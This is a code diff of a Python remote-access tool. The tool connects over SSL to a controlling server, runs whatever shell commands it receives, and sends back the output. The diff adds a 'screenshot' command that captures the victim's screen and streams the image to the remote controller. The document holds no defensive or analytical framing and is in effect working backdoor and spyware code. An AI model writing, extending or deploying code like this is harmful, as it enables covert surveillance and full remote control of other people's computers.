@@ -3,6 +3,7 @@ import ssl
 import subprocess
 import os
 from dotenv import load_dotenv
+from PIL import ImageGrab
 
 SERVER_PORT = 8888
 
@@ -22,7 +23,18 @@ while True:
     command = ssl_socket.recv(1024).decode()
     if command.lower() == 'exit':
         break
-    result = subprocess.run(command, shell=True, capture_output=True, text=True)
-    ssl_socket.send(result.stdout.encode() + result.stderr.encode())
+    elif command.lower() == 'screenshot':
+        screenshot = ImageGrab.grab()
+        screenshot.save('screenshot.png', 'PNG')
+        with open('screenshot.png', 'rb') as f:
+            while True:
+                data = f.read(1024)
+                if not data:
+                    break
+                ssl_socket.sendall(data)
+        ssl_socket.sendall(b'DONE')
+    else:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        ssl_socket.send(result.stdout.encode() + result.stderr.encode())
 
 ssl_socket.close()
